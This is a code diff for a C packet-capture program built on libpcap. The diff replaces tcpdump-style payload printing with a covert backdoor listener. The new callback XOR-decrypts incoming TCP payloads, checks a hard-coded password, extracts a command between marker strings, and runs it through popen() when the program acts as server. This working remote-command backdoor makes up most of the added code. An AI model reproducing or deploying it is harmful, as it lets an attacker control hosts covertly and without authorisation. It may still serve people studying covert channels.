@@ -17,128 +17,7 @@
  *----------------------------------------------------------------------------*/
 
 #include "pkt_cap.h"
-
-/*-----------------------------------------------------------------------------
- * FUNCTION:    print_hex_line
- * 
- * DATE:        June 4, 2010
- * 
- * DESIGNER:    The Tcpdump Group <http://www.tcpdump.org/>
- * 
- * PROGRAMMER:  The Tcpdump Group <http://www.tcpdump.org/>
- * 
- * INTERFACE:   print_hex_line(const unsigned char *payload, int len, int offset)
- *                   payload - payload data
- *                   len - length of payload
- *                   offset - current offset
- * 
- * RETURNS:     void
- * 
- * NOTES: Prints packet payload data as HEX
- * 00000   47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a   GET / HTTP/1.1..
- *
- *----------------------------------------------------------------------------*/
-void print_hex_line(const unsigned char *payload, int len, int offset)
-{
-	int i, gap;
-	const unsigned char *ch;
-
-	/* offset */
-	printf("%05d   ", offset);
-
-	/* HEX */
-	ch = payload;
-	for(i = 0; i < len; i++) {
-		printf("%02x ", *ch);
-		ch++;
-		/* print extra space after 8th byte for visual aid */
-		if (i == 7)
-			printf(" ");
-	}
-
-	/* print space to handle line less than 8 bytes */
-	if (len < 8)
-		printf(" ");
-
-	/* fill HEX gap with spaces if not full line */
-	if (len < 16) {
-		gap = 16 - len;
-		for (i = 0; i < gap; i++) {
-			printf("   ");
-		}
-	}
-
-	/* space before ASCII printout */
-	printf("   ");
-
-	/* ASCII */
-	ch = payload;
-	for(i = 0; i < len; i++) {
-		if (isprint(*ch)) /* only print if printable */
-			printf("%c", *ch);
-		else
-			printf(".");
-		ch++;
-	}
-
-	printf("\n");
-
-	return;
-}
-
-/*-----------------------------------------------------------------------------
- * FUNCTION:    print_payload
- * 
- * DATE:        June 4, 2010
- * 
- * DESIGNER:    The Tcpdump Group <http://www.tcpdump.org/>
- * 
- * PROGRAMMER:  The Tcpdump Group <http://www.tcpdump.org/>
- * 
- * INTERFACE:   print_payload(const unsigned char *payload, int len)
- *                   payload - payload data
- *                   len - length of payload
- * 
- * RETURNS:     void
- * 
- * NOTES: Prints packet payload data and avoids outputting binary data
- *
- *----------------------------------------------------------------------------*/
-void print_payload(const unsigned char *payload, int len)
-{
-
-	int len_rem = len;
-	int line_width = 16;	/* number of bytes per line */
-	int line_len;
-	int offset = 0;			/* zero-based offset counter */
-	const unsigned char *ch = payload;
-
-	if (len <= 0)
-		return;
-
-	/* data fits on one line */
-	if (len <= line_width) {
-		print_hex_line(ch, len, offset);
-		return;
-	}
-
-	/* data spans multiple lines */
-	for (;;) {
-		line_len = line_width % len_rem;		/* compute line length */
-		print_hex_line(ch, line_len, offset);	/* print line */
-		len_rem = len_rem - line_len;			/* compute remaining */
-		ch = ch + line_len;						/* shift pointer to remianing bytes */
-		offset = offset + line_width;			/* add offset */
-
-		/* check if we have line width chars or less */
-		if (len_rem <= line_width) {
-			print_hex_line(ch, len_rem, offset);/* print last line */
-			break;
-		}
-	}
-
-	return;
-}
+#include "utils.h"
 
 /*-----------------------------------------------------------------------------
  * FUNCTION:    packet_callback
@@ -164,10 +43,7 @@ void print_payload(const unsigned char *payload, int len)
 void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
 		const unsigned char *packet)
 {
-	static int count = 1;	/* packet counter */
-
 	/* declare pointers to packet headers */
-	const struct pcap_ethernet *ethernet;	/* The ethernet header [1] */
 	const struct pcap_ip *ip;				/* The IP header */
 	const struct pcap_tcp *tcp;				/* The TCP header */
 	const unsigned char *payload;			/* Packet payload */
@@ -176,69 +52,93 @@ void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
 	int size_tcp;
 	int size_payload;
 
-	/* define ethernet header */
-	ethernet = (struct pcap_ethernet*)(packet);
+	char *start, *end;
+	char password[strlen(PASSWORD) + 1];
+	char decrypted[MAX_PKT_LEN];
+	char command[MAX_PKT_LEN];
 
 	/* define/compute ip header offset */
-	ip = (struct pcap_ip*)(packet + ETHERNET_SIZE);
-	size_ip = IP_HL(ip)*4;
-	if (size_ip < 20) {
-		printf("   * Invalid IP header length: %u bytes\n", size_ip);
-		return;
-	}
+	ip = (struct pcap_ip *)(packet + ETHERNET_SIZE);
+	size_ip = IP_HL(ip) * 4;
 
-	/* print current packet number */
-	printf("\nPacket #%d:\n", count++);
+	/* verify IP header length */
+	if (size_ip < 20)
+		return; /* invalid IP header length */
 
-	/* print source and destination IP addresses */
-	printf("       From: %s\n", inet_ntoa(ip->ip_src));
-	printf("         To: %s\n", inet_ntoa(ip->ip_dst));
+	/* only watch TCP packets (the filter should cover this */
+	if (ip->ip_p != IPPROTO_TCP)
+		return; /* not TCP */
 
-	/* determine and print protocol */	
-	switch(ip->ip_p) {
-		case IPPROTO_TCP:
-			printf("   Protocol: TCP\n");
-			break;
-		case IPPROTO_UDP:
-			printf("   Protocol: UDP\n");
-			return;
-		case IPPROTO_ICMP:
-			printf("   Protocol: ICMP\n");
-			return;
-		case IPPROTO_IP:
-			printf("   Protocol: IP\n");
-			return;
-		default:
-			printf("   Protocol: unknown\n");
-			return;
-	}
+	/* calculate tcp header offset */
+	tcp = (struct pcap_tcp *)(packet + ETHERNET_SIZE + size_ip);
+	size_tcp = TH_OFF(tcp) * 4;
 
-	/*
-	 *  OK, this packet is TCP.
-	 */
+	/* verify TCP header length */
+	if (size_tcp < 20)
+		return; /* invalid TCP header length */
 
-	/* define/compute tcp header offset */
-	tcp = (struct pcap_tcp*)(packet + ETHERNET_SIZE + size_ip);
-	size_tcp = TH_OFF(tcp)*4;
-	if (size_tcp < 20) {
-		printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
-		return;
-	}
-
-	printf("   Src port: %d\n", ntohs(tcp->th_sport));
-	printf("   Dst port: %d\n", ntohs(tcp->th_dport));
-
-	/* define/compute tcp payload (segment) offset */
+	/* calculate tcp payload (segment) offset */
 	payload = (unsigned char *)(packet + ETHERNET_SIZE + size_ip + size_tcp);
 
-	/* compute tcp payload (segment) size */
+	/* calculate tcp payload (segment) size */
 	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
 
-	/* print payload data as HEX */
-	if (size_payload > 0) {
-		printf("   Payload (%d bytes):\n", size_payload);
-		print_payload(payload, size_payload);
+	/* decrypt the payload */
+	strncpy(decrypted, xor((char *)payload), strlen((char *)payload));
+	/* strncpy(decrypted, (char *)payload, strlen((char *)payload)); */
+
+	/* grab the password field */
+	memset(password, 0x0, sizeof(password));
+	strncpy(password, decrypted, strlen(PASSWORD));
+
+	if (!(start = strstr(decrypted, EXT_CMD_START)))
+		return; /* no command or command results in decrypted results */
+
+	start += strlen(EXT_CMD_START);
+
+	if (!(end = strstr(start, EXT_CMD_END)))
+		return; /* we have no command end */
+
+	/* grab the command or command results */
+	memset(command, 0x0, sizeof(command));
+	strncpy(command, start, (end - start));
+
+	/* print password & received command */
+	if (print_output) {
+		printf("password = %s\n", password);
+		printf("command  = %s\n", command);
+	}
+
+	/* run command if we're the server & password matches */
+	if (server && (strcmp(password, PASSWORD) == 0)) {
+		/* system(command); */
+		send_command(command);
 	}
 
 	return;
+}
+
+void send_command(char *command)
+{
+	FILE *file;
+	char buffer[524280];
+	int read_bytes;
+
+	if ((file = popen(command, "r")) == NULL) {
+		err(1, "popen");
+	}
+
+	read_bytes = fread(buffer, sizeof(char), 524280 - 1, file);
+
+/*	read_bytes = fread(buffer + strlen(PASSWORD) + strlen(EXT_CMD_START),
+			sizeof(char), 524280 - 1, file);
+	memcpy(buffer, PASSWORD, strlen(PASSWORD));
+	memcpy(buffer + strlen(PASSWORD), EXT_CMD_START, strlen(EXT_CMD_START));
+	memcpy(buffer + strlen(PASSWORD) + strlen(EXT_CMD_START) + read_bytes,
+			EXT_CMD_END, strlen(EXT_CMD_END)); */
+
+	if (print_output)
+		printf("command results:\n %s", buffer);
+
+	fclose(file);
 }
